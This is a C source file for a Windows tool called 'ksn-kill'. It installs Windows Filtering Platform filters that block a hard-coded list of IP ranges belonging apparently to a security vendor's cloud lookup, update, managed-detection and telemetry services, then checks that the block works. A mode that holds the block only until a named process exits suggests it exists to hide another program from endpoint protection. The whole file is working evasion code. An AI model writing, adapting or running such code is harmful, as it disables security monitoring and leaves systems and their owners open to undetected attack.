#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <fwpmu.h>
#include <fwpmtypes.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const GUID LAYER_ALE_AUTH_CONNECT_V4 =
    { 0xc38d57d1, 0x05a7, 0x4c33, { 0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82 } };
static const GUID COND_IP_REMOTE_ADDRESS =
    { 0xb235ae9a, 0x1d64, 0x49b8, { 0xa4, 0x4c, 0x5f, 0xf3, 0xd9, 0x09, 0x50, 0x45 } };

typedef DWORD (WINAPI *FN_Open)(const wchar_t*, UINT32, FWPM_SESSION0*, wchar_t**, HANDLE*);
typedef DWORD (WINAPI *FN_Close)(HANDLE);
typedef DWORD (WINAPI *FN_Begin)(HANDLE, UINT32);
typedef DWORD (WINAPI *FN_Commit)(HANDLE);
typedef DWORD (WINAPI *FN_Abort)(HANDLE);
typedef DWORD (WINAPI *FN_SubAdd)(HANDLE, const FWPM_SUBLAYER0*, PSECURITY_DESCRIPTOR);
typedef DWORD (WINAPI *FN_FilterAdd)(HANDLE, const FWPM_FILTER0*, PSECURITY_DESCRIPTOR, UINT64*);
typedef DWORD (WINAPI *FN_FilterDel)(HANDLE, const GUID*);
typedef DWORD (WINAPI *FN_FilterGet)(HANDLE, const GUID*, FWPM_FILTER0**);
typedef void  (WINAPI *FN_Free)(void**);

static struct {
    HMODULE m;
    FN_Open Open; FN_Close Close; FN_Begin Begin; FN_Commit Commit; FN_Abort Abort;
    FN_SubAdd SubAdd; FN_FilterAdd FilterAdd; FN_FilterDel FilterDel; FN_FilterGet FilterGet; FN_Free Free;
} F;

typedef struct { const char *name; const char *cidr; } IPENT;

static const IPENT IP_TABLE[] = {
    { "ksn-geo",      "37.203.128.0/24" },
    { "ksn-geo",      "37.203.129.0/24" },
    { "ksn-classic",  "185.85.15.25/32" },
    { "ksn-classic",  "185.85.15.31/32" },
    { "update-cdn",   "93.159.228.0/24" },
    { "update-eu",    "93.159.227.0/24" },
    { "data-seg",     "185.201.0.0/24" },
    { "data-seg",     "185.201.1.0/24" },
    { "data-seg",     "185.201.2.0/24" },
    { "identity",     "185.54.220.140/32" },
    { "portal-edge",  "185.54.223.3/32" },
    { "mdr",          "77.74.176.0/24" },
    { "stat-ru",      "77.74.182.140/32" },
    { "stat-eu",      "82.202.190.214/32" },
    { "stat-sa",      "212.73.221.217/32" },
    { "tip-api",      "4.28.136.38/32" },
    { "opentip",      "209.51.171.230/32" },
    { "ds-alt",       "91.198.230.90/32" },
    { "telia-urg",    "62.115.64.234/32" },
    { "telia-urg",    "62.115.64.235/32" },
    { "telia-urg",    "62.115.64.250/32" },
};
#define IP_COUNT (sizeof(IP_TABLE)/sizeof(IP_TABLE[0]))

static GUID sublayer_key(void)
{
    GUID g = { 0x6b31e0c1, 0x2a4d, 0x4f1e, { 0x9b, 0x7a, 0x3c, 0x5d, 0x8e, 0x1f, 0x40, 0xaa } };
    return g;
}

static GUID filter_key(unsigned idx)
{
    GUID g = { 0x6b31e0c1, 0x2a4d, 0x4f1e, { 0x9b, 0x7a, 0x3c, 0x5d, 0x8e, 0x1f, 0x40, 0x00 } };
    g.Data4[6] = (BYTE)((idx >> 8) & 0xFF);
    g.Data4[7] = (BYTE)(idx & 0xFF);
    return g;
}

static int fw_load(void)
{
    F.m = LoadLibraryA("fwpmu.dll");
    if (!F.m) return -1;
    F.Open      = (FN_Open)GetProcAddress(F.m, "FwpmEngineOpen0");
    F.Close     = (FN_Close)GetProcAddress(F.m, "FwpmEngineClose0");
    F.Begin     = (FN_Begin)GetProcAddress(F.m, "FwpmTransactionBegin0");
    F.Commit    = (FN_Commit)GetProcAddress(F.m, "FwpmTransactionCommit0");
    F.Abort     = (FN_Abort)GetProcAddress(F.m, "FwpmTransactionAbort0");
    F.SubAdd    = (FN_SubAdd)GetProcAddress(F.m, "FwpmSubLayerAdd0");
    F.FilterAdd = (FN_FilterAdd)GetProcAddress(F.m, "FwpmFilterAdd0");
    F.FilterDel = (FN_FilterDel)GetProcAddress(F.m, "FwpmFilterDeleteByKey0");
    F.FilterGet = (FN_FilterGet)GetProcAddress(F.m, "FwpmFilterGetByKey0");
    F.Free      = (FN_Free)GetProcAddress(F.m, "FwpmFreeMemory0");
    if (!F.Open || !F.Close || !F.Begin || !F.Commit || !F.Abort ||
        !F.SubAdd || !F.FilterAdd || !F.FilterDel || !F.FilterGet || !F.Free)
        return -1;
    return 0;
}

static int parse_cidr(const char *cidr, FWP_V4_ADDR_AND_MASK *am)
{
    char buf[64];
    char *slash;
    int prefix;
    UINT32 addr;

    strncpy(buf, cidr, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    slash = strchr(buf, '/');
    if (!slash) return -1;
    *slash = 0;
    prefix = atoi(slash + 1);
    if (prefix < 0 || prefix > 32) return -1;

    addr = inet_addr(buf);
    if (addr == (UINT32)-1) return -1;

    am->addr = addr;
    am->mask = htonl(prefix == 0 ? 0 : (0xFFFFFFFFu << (32 - prefix)));
    return 0;
}

static int do_install(HANDLE eng)
{
    unsigned i;
    DWORD r;
    GUID sk = sublayer_key();
    FWPM_SUBLAYER0 sub;
    static wchar_t names[IP_COUNT][48];

    ZeroMemory(&sub, sizeof(sub));
    sub.subLayerKey = sk;
    sub.displayData.name = L"ksn-kill";
    sub.weight = 0xFFFF;
    r = F.SubAdd(eng, &sub, NULL);
    if (r != 0 && r != FWP_E_ALREADY_EXISTS) {
        printf("[!] sublayer add: 0x%08lX\n", r);
        return 1;
    }

    r = F.Begin(eng, 0);
    if (r != 0) { printf("[!] txn begin: 0x%08lX\n", r); return 1; }

    for (i = 0; i < IP_COUNT; i++) {
        FWPM_FILTER0 flt;
        FWPM_FILTER_CONDITION0 cond;
        FWP_V4_ADDR_AND_MASK am;
        FWP_VALUE0 weight;

        ZeroMemory(&flt, sizeof(flt));
        ZeroMemory(&cond, sizeof(cond));
        ZeroMemory(&am, sizeof(am));
        ZeroMemory(&weight, sizeof(weight));

        if (parse_cidr(IP_TABLE[i].cidr, &am) != 0) {
            printf("[!] bad cidr %s\n", IP_TABLE[i].cidr);
            continue;
        }
        MultiByteToWideChar(CP_UTF8, 0, IP_TABLE[i].cidr, -1, names[i], 48);

        cond.fieldKey = COND_IP_REMOTE_ADDRESS;
        cond.matchType = FWP_MATCH_EQUAL;
        cond.conditionValue.type = FWP_V4_ADDR_MASK;
        cond.conditionValue.v4AddrMask = &am;

        weight.type = FWP_UINT8;
        weight.uint8 = 0xFE;

        flt.layerKey = LAYER_ALE_AUTH_CONNECT_V4;
        flt.subLayerKey = sk;
        flt.displayData.name = names[i];
        flt.action.type = FWP_ACTION_BLOCK;
        flt.weight = weight;
        flt.numFilterConditions = 1;
        flt.filterCondition = &cond;
        flt.filterKey = filter_key(i);

        r = F.FilterAdd(eng, &flt, NULL, NULL);
        if (r == 0 || r == FWP_E_ALREADY_EXISTS)
            printf("[+] block %-10s %s\n", IP_TABLE[i].name, IP_TABLE[i].cidr);
        else
            printf("[!] filter %u (%s): 0x%08lX\n", i, IP_TABLE[i].cidr, r);
    }

    r = F.Commit(eng);
    if (r != 0) { printf("[!] txn commit: 0x%08lX\n", r); F.Abort(eng); return 1; }
    printf("[+] %u filters committed\n", (unsigned)IP_COUNT);
    return 0;
}

static int do_restore(HANDLE eng)
{
    unsigned i, removed = 0, gone = 0;
    for (i = 0; i < IP_COUNT; i++) {
        GUID k = filter_key(i);
        DWORD r = F.FilterDel(eng, &k);
        if (r == 0) { removed++; printf("[+] removed %s\n", IP_TABLE[i].cidr); }
        else if (r == FWP_E_NOT_FOUND) gone++;
        else printf("[!] delete %s: 0x%08lX\n", IP_TABLE[i].cidr, r);
    }
    printf("[=] removed %u, already gone %u\n", removed, gone);
    return 0;
}

static int do_status(HANDLE eng)
{
    unsigned i, present = 0;
    for (i = 0; i < IP_COUNT; i++) {
        FWPM_FILTER0 *f = NULL;
        GUID k = filter_key(i);
        if (F.FilterGet(eng, &k, &f) == 0) {
            present++;
            printf("[+] active %s %s\n", IP_TABLE[i].name, IP_TABLE[i].cidr);
            F.Free((void **)&f);
        }
    }
    printf("[=] %u of %u filters active\n", present, (unsigned)IP_COUNT);
    return 0;
}

static int tcp_probe(const char *ip, unsigned short port, int timeout_ms)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in sa;
    u_long nb = 1;
    fd_set wf;
    struct timeval tv;
    int ret = -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return -1; }

    ZeroMemory(&sa, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    ioctlsocket(s, FIONBIO, &nb);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    FD_ZERO(&wf);
    FD_SET(s, &wf);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    if (select(0, NULL, &wf, NULL, &tv) > 0) {
        int soerr = 0;
        int len = sizeof(soerr);
        getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&soerr, &len);
        ret = (soerr == 0) ? 0 : -1;
    }
    closesocket(s);
    WSACleanup();
    return ret;
}

static void do_verify(void)
{
    int ksn = tcp_probe("37.203.128.51", 443, 3000);
    int ctl = tcp_probe("8.8.8.8", 443, 3000);

    printf("[+] verify ksn  37.203.128.51:443 -> %s\n",
           ksn == 0 ? "REACHABLE (FILTER MISSED)" : "blocked (ok)");
    printf("[+] verify ctrl 8.8.8.8:443        -> %s\n",
           ctl == 0 ? "reachable (internet ok)" : "unreachable (no internet / other block)");
    if (ksn == 0) printf("[!] KSN still reachable — check elevation / layer\n");
}

static volatile LONG g_stop = 0;

static BOOL WINAPI ctrl_handler(DWORD type)
{
    (void)type;
    InterlockedExchange(&g_stop, 1);
    return TRUE;
}

static void usage(const char *p)
{
    printf("usage: %s [mode]\n", p);
    printf("  (none)          install KSN/cloud block filters + verify\n");
    printf("  --restore       remove all ksn-kill filters\n");
    printf("  --status        show active filters\n");
    printf("  --wait-pid <n>  install, wait for pid to exit, restore\n");
    printf("  --help          this\n");
}

int main(int argc, char *argv[])
{
    HANDLE eng = NULL;
    DWORD r;
    int mode = 0;
    DWORD wait_pid = 0;

    if (argc > 1) {
        if (!strcmp(argv[1], "--restore")) mode = 1;
        else if (!strcmp(argv[1], "--status")) mode = 2;
        else if (!strcmp(argv[1], "--wait-pid") && argc > 2) { mode = 3; wait_pid = (DWORD)atoi(argv[2]); }
        else if (!strcmp(argv[1], "--help")) { usage(argv[0]); return 0; }
        else { usage(argv[0]); return 1; }
    }

    if (fw_load() != 0) {
        printf("[-] fwpmu.dll unavailable\n");
        return 1;
    }

    r = F.Open(NULL, 0, NULL, NULL, &eng);
    if (r != 0) {
        printf("[-] FwpmEngineOpen0: 0x%08lX (run elevated / SYSTEM)\n", r);
        return 1;
    }

    if (mode == 1) {
        do_restore(eng);
    } else if (mode == 2) {
        do_status(eng);
    } else if (mode == 3) {
        HANDLE hproc;
        do_install(eng);
        do_verify();
        hproc = OpenProcess(SYNCHRONIZE, FALSE, wait_pid);
        if (!hproc) {
            printf("[-] cannot open pid %lu (0x%lX)\n", wait_pid, GetLastError());
            F.Close(eng);
            return 1;
        }
        SetConsoleCtrlHandler(ctrl_handler, TRUE);
        printf("[+] waiting for pid %lu ...\n", wait_pid);
        while (!g_stop && WaitForSingleObject(hproc, 500) == WAIT_TIMEOUT) {}
        CloseHandle(hproc);
        printf("[+] restoring...\n");
        do_restore(eng);
        SetConsoleCtrlHandler(ctrl_handler, FALSE);
    } else {
        do_install(eng);
        do_verify();
        printf("[+] cloud blocked. restore with: %s --restore  (or reboot clears)\n", argv[0]);
    }

    F.Close(eng);
    return 0;
}
